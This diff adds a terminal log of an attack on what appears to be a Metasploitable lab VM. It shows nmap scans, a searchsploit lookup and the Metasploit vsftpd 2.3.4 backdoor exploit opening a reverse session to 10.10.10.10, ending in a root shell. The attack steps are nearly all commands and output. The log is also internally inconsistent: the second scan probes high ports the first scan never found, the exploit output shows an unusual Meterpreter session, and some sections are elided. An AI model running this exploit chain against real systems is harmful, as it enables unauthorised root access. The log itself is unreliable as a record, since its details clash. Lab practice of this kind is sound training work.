@@ -1,0 +1,130 @@
+$ sudo nmap -sS -p- --min-rate 1000 -oA portScan 10.10.10.20
+Starting Nmap 7.99 ( https://nmap.org ) at 2026-10-22 00:48 -0400
+Nmap scan report for 10.10.10.20
+Host is up (0.00054s latency).
+Not shown: 65505 closed tcp ports (reset)
+PORT      STATE SERVICE
+21/tcp    open  ftp
+22/tcp    open  ssh
+23/tcp    open  telnet
+25/tcp    open  smtp
+53/tcp    open  domain
+80/tcp    open  http
+111/tcp   open  rpcbind
+139/tcp   open  netbios-ssn
+445/tcp   open  microsoft-ds
+512/tcp   open  exec
+513/tcp   open  login
+514/tcp   open  shell
+1099/tcp  open  rmiregistry
+1524/tcp  open  ingreslock
+2049/tcp  open  nfs
+2121/tcp  open  ccproxy-ftp
+3306/tcp  open  mysql
+3632/tcp  open  distccd
+5432/tcp  open  postgresql
+5900/tcp  open  vnc
+6000/tcp  open  X11
+6667/tcp  open  irc
+6697/tcp  open  ircs-u
+8009/tcp  open  ajp13
+8180/tcp  open  unknown
+8787/tcp  open  msgsrvr
+38261/tcp open  unknown
+38454/tcp open  unknown
+50628/tcp open  unknown
+55347/tcp open  unknown
+MAC Address: 08:00:27:A5:80:C7 (Oracle VirtualBox virtual NIC)
+
+Nmap done: 1 IP address (1 host up) scanned in 17.34 seconds
+
+
+$ nmap -sV -sC -p 21,22,23,25,53,80,111,139,445,512,513,514,1099,1524,2049,2121,3306,3632,5432,5900,6000,6667,6697,8009,8180,8787,33500,43594,57503,58235 -oA deepScan 10.10.10.20
+Starting Nmap 7.99 ( https://nmap.org ) at 2026-10-22 00:56 -0400
+Nmap scan report for 10.10.10.20
+Host is up (0.0050s latency).
+
+PORT     STATE SERVICE    VERSION
+21/tcp   open  ftp        vsftpd 2.3.4
+|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
+| ftp-syst:
+|   STAT:
+| FTP server status:
+|      Connected to 10.10.10.10
+|      Logged in as ftp
+|      TYPE: ASCII
+|      No session bandwidth limit
+|      Session timeout in seconds is 300
+|      Control connection is plain text
+|      Data connections will be plain text
+|      vsFTPd 2.3.4 - secure, fast, stable
+|_End of status
+22/tcp   open  ssh        OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
+| ssh-hostkey:
+|   1024 60:0f:cf:e1:c0:5f:6a:74:d6:90:24:fa:c4:d5:6c:cd (DSA)
+|_  2048 56:56:24:0f:21:1d:de:a7:2b:ae:61:b1:24:3d:e8:f3 (RSA)
+23/tcp   open  telnet     Linux telnetd
+25/tcp   open  smtp       Postfix smtpd
+| ssl-cert: Subject: commonName=ubuntu804-base.localdomain/...
+| Not valid before: 2010-03-17T14:07:45
+|_Not valid after:  2010-04-16T14:07:45
+|_smtp-commands: metasploitable.localdomain, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN
+| sslv2:
+|   SSLv2 supported
+|   ciphers:
+|     SSL2_DES_64_CBC_WITH_MD5
+|     SSL2_RC2_128_CBC_EXPORT40_WITH_MD5
+|     SSL2_RC4_128_WITH_MD5
+|     SSL2_DES_192_EDE3_CBC_WITH_MD5
+|     SSL2_RC4_128_EXPORT40_WITH_MD5
+|_    SSL2_RC2_128_CBC_WITH_MD5
+53/tcp   open  domain     ISC BIND 9.4.2
+| dns-nsid:
+|_  bind.version: 9.4.2
+80/tcp   open  http       Apache httpd 2.2.8 ((Ubuntu) DAV/2)
+[... remaining ports omitted for brevity — mysql 5.0.51a, distccd, postgresql,
+     vnc, X11, irc, ajp13 etc., each with their own version banners ...]
+
+
+$ searchsploit --nmap deepScan.xml
+[i] SearchSploit's XML mode (without verbose enabled).
+[-] Skipping term: ftp (Term is too general. Please re-search manually: /usr/bin/searchsploit -t ftp)
+[i] /usr/bin/searchsploit -t vsftpd 2.3.4
+
+ Exploit Title                                                | Path
+----------------------------------------------------------------------------
+ vsftpd 2.3.4 - Backdoor Command Execution                    | unix/remote/49757.py
+ vsftpd 2.3.4 - Backdoor Command Execution (Metasploit)        | unix/remote/17491.rb
+
+[... additional matches for openssh, proftpd, mysql, distccd, postgresql ...]
+
+
+$ msfconsole
+msf > use exploit/unix/ftp/vsftpd_234_backdoor
+msf exploit(unix/ftp/vsftpd_234_backdoor) > set rhosts 10.10.10.20
+rhosts => 10.10.10.20
+msf exploit(unix/ftp/vsftpd_234_backdoor) > set lhost 10.10.10.10
+lhost => 10.10.10.10
+msf exploit(unix/ftp/vsftpd_234_backdoor) > run
+
+[*] Started reverse TCP handler on 10.10.10.10:4444
+[*] 10.10.10.20:21 - Running automatic check ("set AutoCheck false" to disable)
+[*] 10.10.10.20:21 - FTP banner hints its vulnerable: 220 (vsFTPd 2.3.4)
+[+] 10.10.10.20:21 - The target appears to be vulnerable. vsftpd 2.3.4 banner detected; backdoor may be present
+[+] 10.10.10.20:21 - Backdoor has been spawned!
+[*] Meterpreter session 1 opened (10.10.10.10:4444 -> 10.10.10.20:46463) at 2026-10-22 06:02:15 -0400
+
+meterpreter > getuid
+Server username: root
+meterpreter > sysinfo
+Computer     : metasploitable.localdomain
+OS           : Ubuntu 8.04 (Linux 2.6.24-16-server)
+Architecture : i686
+BuildTuple   : i486-linux-musl
+Meterpreter  : x86/linux
+meterpreter > shell
+Process 4708 created.
+Channel 1 created.
+id
+whoami
+root
